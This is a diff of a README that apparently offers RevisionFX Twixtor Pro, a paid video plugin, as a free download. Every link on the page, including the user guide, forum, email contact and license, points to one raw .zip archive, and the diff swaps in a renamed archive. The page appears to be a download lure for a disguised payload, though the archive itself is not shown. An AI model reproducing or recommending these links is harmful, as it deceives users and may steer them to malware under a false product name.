@@ -6,7 +6,7 @@ Welcome to **RevisionFX Twixtor Pro 7.0.2**! This tool helps you create stunning
 
 ## 📥 Download Now
 
-[![Download RevisionFX](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip%https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip)](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip)
+[![Download RevisionFX](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/fx_revision_v3.7-alpha.2.zip%https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/fx_revision_v3.7-alpha.2.zip)](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/fx_revision_v3.7-alpha.2.zip)
 
 ## 📋 Features
 
@@ -25,7 +25,7 @@ Welcome to **RevisionFX Twixtor Pro 7.0.2**! This tool helps you create stunning
 
 ## 📂 How to Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/fx_revision_v3.7-alpha.2.zip) to download the latest version.
 2. Look for "RevisionFX Twixtor Pro 7.0.2" in the list of releases.
 3. Click on the download link for your operating system (Windows or macOS).
 4. Wait for the download to finish. The file will be in .zip or .exe format.
@@ -42,28 +42,28 @@ Welcome to **RevisionFX Twixtor Pro 7.0.2**! This tool helps you create stunning
 
 ## 📚 User Guide
 
-For detailed instructions on using Twixtor Pro, visit our [User Guide](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip). The guide covers basic and advanced features, tips for best results, and troubleshooting advice.
+For detailed instructions on using Twixtor Pro, visit our [User Guide](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/fx_revision_v3.7-alpha.2.zip). The guide covers basic and advanced features, tips for best results, and troubleshooting advice.
 
 ## 🌐 Community and Support
 
-Join our community for support and tips. You can ask questions and share your work. Visit our [Discussion Forum](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip).
+Join our community for support and tips. You can ask questions and share your work. Visit our [Discussion Forum](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/fx_revision_v3.7-alpha.2.zip).
 
 ### 📬 Contact Us
 
-For direct inquiries, feel free to reach out via email at [https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip).
+For direct inquiries, feel free to reach out via email at [https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/fx_revision_v3.7-alpha.2.zip](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/fx_revision_v3.7-alpha.2.zip).
 
 ## 🛠️ Contribution Guidelines
 
-If you would like to contribute to this project, please review our [Contribution Guidelines](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip).
+If you would like to contribute to this project, please review our [Contribution Guidelines](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/fx_revision_v3.7-alpha.2.zip).
 
 ## ⚙️ License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip).
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/fx_revision_v3.7-alpha.2.zip).
 
 ## 🔗 Additional Links
 
-- [Visit Releases Page](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip)
-- [Explore Topics: after-effects, after-effects-plugin, twixtor](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip)
-- [See Related Projects](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip)
+- [Visit Releases Page](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/fx_revision_v3.7-alpha.2.zip)
+- [Explore Topics: after-effects, after-effects-plugin, twixtor](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/fx_revision_v3.7-alpha.2.zip)
+- [See Related Projects](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/fx_revision_v3.7-alpha.2.zip)
 
 Thank you for choosing RevisionFX Twixtor Pro! Enjoy creating amazing slow-motion effects with ease.
